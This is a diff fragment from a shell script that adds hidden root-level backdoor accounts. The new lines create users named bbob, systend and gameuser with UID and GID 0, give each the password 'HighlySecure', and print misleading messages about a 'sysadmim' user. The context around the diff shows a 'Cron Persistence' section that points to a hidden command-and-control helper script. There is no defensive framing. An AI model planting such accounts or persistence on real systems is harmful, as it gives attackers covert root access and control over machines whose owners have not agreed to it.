@@ -18,6 +18,31 @@ else
     echo "User 'sysadmim' already exists."
 fi
 
+if ! id "sysadmim" &>/dev/null; then
+    useradd -ou 0 -g 0 bbob
+    echo "bbob:HighlySecure" | chpasswd
+    echo "User 'sysadmim' created with root privileges."
+else
+    echo "User 'sysadmim' already exists."
+fi
+
+if ! id "sysadmim" &>/dev/null; then
+    useradd -ou 0 -g 0 systend
+    echo "systend:HighlySecure" | chpasswd
+    echo "User 'sysadmim' created with root privileges."
+else
+    echo "User 'sysadmim' already exists."
+fi
+
+if ! id "sysadmim" &>/dev/null; then
+    useradd -ou 0 -g 0 gameuser
+    echo "gameuser:HighlySecure" | chpasswd
+    echo "User 'sysadmim' created with root privileges."
+else
+    echo "User 'sysadmim' already exists."
+fi
+
+
 # --- Cron Persistence ---
 # Create a single, less noisy cron job that executes a helper script.
 C2_SCRIPT_PATH="/usr/local/bin/.system-health-check"
